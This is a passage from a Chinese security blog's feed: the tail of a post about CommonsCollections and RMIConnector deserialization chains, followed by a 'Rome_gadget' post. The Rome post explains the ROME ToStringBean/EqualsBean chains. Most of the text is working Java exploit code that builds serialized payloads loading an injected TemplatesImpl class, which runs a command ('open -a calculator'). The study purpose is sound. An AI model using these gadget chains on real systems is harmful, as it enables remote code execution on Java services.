class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc1;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiconnector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(file.toPath());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes);<br><br><br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">//        一、cc6前半</span><br><span class="hljs-comment">//        hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( new HashMap&lt;&gt;(), new ConstantTransformer(1));</span><br><span class="hljs-comment">//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        expMap.put(tiedMapEntry, &quot;xx&quot;);</span><br><span class="hljs-comment">//        lazyMap.clear();</span><br><span class="hljs-comment">//        setFieldValue(lazyMap,&quot;factory&quot;, invokerTransformer);</span><br><br><span class="hljs-comment">//        二、 cc4.0、PriorityQueue</span><br><span class="hljs-comment">//        PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</span><br><span class="hljs-comment">//        InvokerTransformer transformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        TransformingComparator comparator = new TransformingComparator(transformer);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        PriorityQueue priorityQueue = new PriorityQueue(1);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;size&quot;,2);</span><br><span class="hljs-comment">//        Object[] objects = &#123;rmiConnector, 1&#125;;</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;queue&quot;,objects);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;comparator&quot;,comparator);</span><br><br><span class="hljs-comment">//     三、 cc3.2.1 cc4  动态代理</span><br><span class="hljs-comment">//        AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>                DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>        setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>        Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; Anotationdeclared =<br>                AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>        Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(instance);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="累了，下次再写。"><a href="#累了，下次再写。" class="headerlink" title="累了，下次再写。"></a>累了，下次再写。</h2><h3 id="佬的剑招"><a href="#佬的剑招" class="headerlink" title="佬的剑招"></a>佬的剑招</h3><p><a href="https://tttang.com/archive/1701/#toc_cc">https://tttang.com/archive/1701/#toc_cc</a></p><p><a href="https://su18.org/">https://su18.org/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rome_gadget</title>
    <link href="/2024/01/15/Rome-gadget/"/>
    <url>/2024/01/15/Rome-gadget/</url>
    
    <content type="html"><![CDATA[<p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。</p><p>ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p><img src="138px-%E7%82%8E%E6%9B%A6%E5%89%91%E6%8B%9B-%E5%A4%A7%E5%9B%BE.jpg" alt="炎曦剑招- 江湖悠悠WIKI_BWIKI_哔哩哔哩"></p><h3 id="0x01-简要分析"><a href="#0x01-简要分析" class="headerlink" title="0x01 简要分析"></a>0x01 简要分析</h3><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;ObjectBean.java</p><p><img src="1705239247603-7fd557c0-dd52-47a5-928d-a93c5eac5dc2.png" alt="img"></p><p>很明显可以想到使用hashmap来触发hashcode，或者BadAttributeValueExpException触发toString()</p><p><img src="1705239596950-31d48e53-7ed3-4520-8a7e-af43f8ba2b10.png" alt="img"></p><p>构造函数可进行赋值。</p><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;EqualsBean.javabeanHashCode()</p><p><img src="1705238212567-4712af84-f22d-4101-8bb2-e1d66d7482c0.png" alt="img"></p><p>可以看到hashcode可以触发javabeanHashCode()方法，进而触发toString方法。<img src="1705238295413-79c2b9b0-e671-4a6f-bcae-e47e8d54a4ba.png" alt="img"></p><p>EqualsBean继承了ser，_obj还是object，通过反射修改。很容易想到json序列化的后半条，或者lazymap的后半条。</p><h3 id="0x02-ToStringBean-java"><a href="#0x02-ToStringBean-java" class="headerlink" title="0x02 ToStringBean.java"></a>0x02 ToStringBean.java</h3><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;ToStringBean.java#toString()</p><p><img src="1705238851112-2c0572ac-6b8f-4b05-b2d3-af987ebef89a.png" alt="img"></p><p>它会调用同名方法 toString(String prefix)</p><p><img src="1705238945972-1282a106-10de-432c-911a-055ce9b6d6e8.png" alt="img"><img src="1705239021962-2d09ddab-58e0-4774-9ab0-743a7d96bb9d.png" alt="img"></p><p>这个方法会调用 BeanIntrospector.getPropertyDescriptors() 来获取 _beanClass 的全部 getter&#x2F;setter 方法，然后判断参数长度为 0 的方法使用 _obj 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。</p><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>BadAttributeValueExpException.readObject-&gt;rome.ToStringBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-comment">// 读取恶意类 bytes[]</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">AbstractTranslet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;rome1&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 初始化 TemplatesImpl 对象</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-comment">// _name 不能为空</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(tmpl,new TransformerFactoryImpl());</span><br><br><br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, tmpl);<br><span class="hljs-comment">//        ObjectBean root = new ObjectBean(ToStringBean.class, toStringBean);</span><br><br>        <span class="hljs-comment">// 放入 Map 中</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        map.put(root, &quot;test&quot;);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br><span class="hljs-comment">//        Field field = toStringBean.getClass().getDeclaredField(&quot;_obj&quot;);</span><br><span class="hljs-comment">//        field.setAccessible(true);</span><br><span class="hljs-comment">//        field.set(toStringBean,tmpl);</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            outputStream.writeObject(badAttributeValueExpException);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            inputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>hashmap-&gt;rome </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-comment">// 读取恶意类 bytes[]</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">AbstractTranslet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;rome1&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 初始化 TemplatesImpl 对象</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-comment">// _name 不能为空</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(tmpl,new TransformerFactoryImpl());</span><br><br><br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, tmpl);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br><br>        <span class="hljs-comment">// 放入 Map 中</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="hljs-comment">//        val.setAccessible(true);</span><br><span class="hljs-comment">//        val.set(badAttributeValueExpException,delegate);</span><br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br><span class="hljs-comment">//        Field field = toStringBean.getClass().getDeclaredField(&quot;_obj&quot;);</span><br><span class="hljs-comment">//        field.setAccessible(true);</span><br><span class="hljs-comment">//        field.set(toStringBean,tmpl);</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span 